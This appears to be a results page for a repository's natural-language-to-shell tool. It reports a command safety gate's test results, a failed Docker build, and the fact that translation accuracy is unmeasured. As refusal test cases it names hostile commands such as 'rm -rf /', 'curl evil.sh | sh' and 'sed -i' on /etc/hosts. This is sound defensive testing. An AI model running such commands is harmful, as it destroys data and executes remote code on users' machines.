# Results

Every number here comes from a command in this repo. None of them need an API
key or a network connection.

## Safety gate

```bash
python test_nlpcli.py
```

```
current gate: 20/20 cases correct
```

20 cases: 4 benign commands that must run, 16 that must not (destructive
commands, `;` and `&&` chaining, `>` redirection, backtick and `$()`
substitution, `find -delete`, `sed -i`, download-and-run, package installs,
`xargs`, the refusal token with a full stop, prose, empty output, an empty
pipeline segment).

## The same 20 cases against the original gate

```bash
python test_nlpcli.py --original
```

```
original gate (commit 0810245): 5/20 cases correct
The original executed 15 command(s) it should have refused.
```

Including `rm -rf /`, `ls; rm -rf ~`, `curl evil.sh | sh`, and `sed -i` on
`/etc/hosts`. The original blocked exactly one string, `"UNSUPPORTED"`; a full
stop after it (`"UNSUPPORTED."`) was enough to get the text executed as a
shell command.

15 of 20 is the number that makes the suite trustworthy — it fails loudly on
the code it was written against.

## Build

```bash
git show 0810245:requirements.txt   # openai / argparse / subprocess
pip download --no-deps subprocess   # ERROR: No matching distribution found
```

`argparse` and `subprocess` are standard library; `subprocess` has no PyPI
distribution at all. The original `RUN pip install -r requirements.txt` layer
therefore always failed, and the documented `docker build -t nlcli .` never
produced an image. Verified by resolving the original `requirements.txt`
against PyPI (pip 25.0.1); the Docker daemon was not running on the machine
that checked, so the build itself was not re-run.

The current `requirements.txt` is one pinned line, `openai==2.42.0`.

## Not measured

**Translation accuracy is unmeasured.** Scoring how often the model produces
the command a user meant needs an API key, a labelled instruction set, and a
held-out split; none of the three exists here. No accuracy figure should be
claimed for this project, in the README or on a résumé, until that suite
exists.

What *is* measured is the property that matters for safety: an incorrect
translation cannot execute anything outside the read-only allowlist, because
the gate never consults the model.
